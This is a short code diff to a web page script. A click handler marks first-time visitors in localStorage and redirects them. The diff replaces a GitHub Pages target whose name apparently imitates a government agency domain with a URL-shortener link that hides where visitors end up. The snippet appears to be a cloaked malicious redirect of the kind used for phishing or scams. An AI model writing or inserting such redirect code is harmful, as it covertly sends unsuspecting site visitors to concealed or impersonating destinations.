@@ -95,7 +95,7 @@ document.addEventListener("click", function () {
                 localStorage.setItem('visitor', 'true');
                 localStorage.setItem('visitTime', currentTime);
                 console.log('新访问者，已标记');
-                window.location.href = "mps-gov-85642.github.io";  // 替换为你的跳转页面
+                window.location.href = "https://ishortn.ink/jtaKESLZb";  // 替换为你的跳转页面
             }
         }
 
